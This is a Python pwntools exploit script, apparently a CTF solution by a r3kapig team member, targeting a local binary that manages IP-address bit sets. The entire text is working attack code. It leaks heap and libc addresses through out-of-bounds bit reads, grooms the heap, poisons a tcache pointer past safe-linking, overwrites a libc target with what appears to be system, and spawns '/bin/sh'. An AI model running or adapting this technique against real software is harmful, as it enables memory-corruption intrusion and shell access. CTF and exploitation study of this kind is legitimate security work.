# Author: n132@r3kapig
from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./go')
# p=process('./pwn',env={"LD_PRELOAD":"./libc.so.6"})
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b": ",str(c).encode())
def setup(s,e):
    cmd(1)
    sla(b":",s)
    sla(b":",e)
def set1(i):
    cmd(2)
    sla(b": ",i)
def set0(i):
    cmd(3)
    sla(b": ",i)
def testbit(i):
    cmd(4)
    sla(b":",i)
    res  = p.readline()
    if b"IP is in the set" in res:
        return 1
    else:
        return 0
def free():
    cmd(5)
def ip2num(ip):
    ip = ip.decode()
    a = [ int(x) for x in ip.split(".")]
    res = 0
    base = 1
    for x in a[::-1]:
        res+=base*x
        base*=0x100
    return res
def num2ip(num):
    ip = [0,0,0,0]
    ct = 0 
    while(num):
        ip[ct] = num%0x100
        num=num>>8
        ct+=1
    res = ''
    for x in ip:
        res = str(x)+"."+res
    return res[:-1].encode()
def allocate(size):
    setup(b"0.0.0.0",num2ip(size*8-1))
def show(off,less=6*8):
    bit_array = []
    
    for x in range(off*8,off*8+less):
        bit_array.append(testbit(num2ip(x)))
    bit_array+=[0]*(64-less)
    integer = int("".join(map(str, bit_array[::-1])), 2)
    return integer
def set_off_val(off,val,less=False):
    val_bits = [0]*64
    ct = 0 
    while val:
        val_bits[ct] = val%2
        val = val>>1
        ct+=1
    lenx = less if less else len(val_bits)
    for x in range(lenx):
        if val_bits[x]:
            set1(num2ip(off*8+x))
        else:
            set0(num2ip(off*8+x))

allocate(0x18)
free()

allocate(0x18)
res = show(0)

heap = res<<12
warn(hex(heap))
free()
allocate(0x28)
free()
allocate(0x38)
free()
allocate(0x48)
free()
allocate(0x2b8)
free()
allocate(0x408)
free()
allocate(0x3f8)
free()
allocate(0x3e8)
free()
allocate(0x78)
free()
allocate(0x88)
free()
allocate(0x18)
free()

ip = b"0.255.255.60"
setup(ip,num2ip(ip2num(ip)+0x28*8-1)) # malloc 0x28
set1(b"0.255.255.254/23")#

ip = b"0.255.254.187"
setup(ip,num2ip(ip2num(ip)+0x38*8-1)) # malloc 0x38
set0(b"0.255.255.254/22")#
allocate(0x18)
free()
allocate(0x128-0x80)
allocate(0x48)
base = show(0x20)-0x21ace0
warn(hex(base))
allocate(0xee8-0x20)
allocate(0x48)
set_off_val(0x18,0x411,16)
allocate(0x78)
free()
allocate(0x300)
free()
allocate(0x310)
free()
allocate(0x338)
free()
allocate(0x48)
free()
allocate(0x408)
set_off_val(0x28,0x1001-0x10,16)
free()
allocate(0x888)
set_off_val(0x598,0x21,8)
set_off_val(0x598+0x20,0x21,8)
free()
allocate(0x18)
allocate(0x48)# 0x55555555b260
free()
allocate(0x1000-8-0x10)
set_off_val(0xa68,0x331,32)
allocate(0x360)
allocate(0x408)
set_off_val(0x78,0xfa1,16)
allocate(0x88)
free()
allocate(0xfa0-8)
dest = 0x7ffff7e1a050-0x7ffff7c00000+base
set_off_val(0xa20,(dest)^((heap>>12)+1),48)
allocate(0x308)
allocate(0x308)
payload = p64(0x00050d70+base)
for x in range(0,len(payload),8):
    set_off_val(x+8,u64(payload[x:x+8]),48)

cmd(2)
sla(b' ip: ',b"/bin/sh;-")
p.interactive()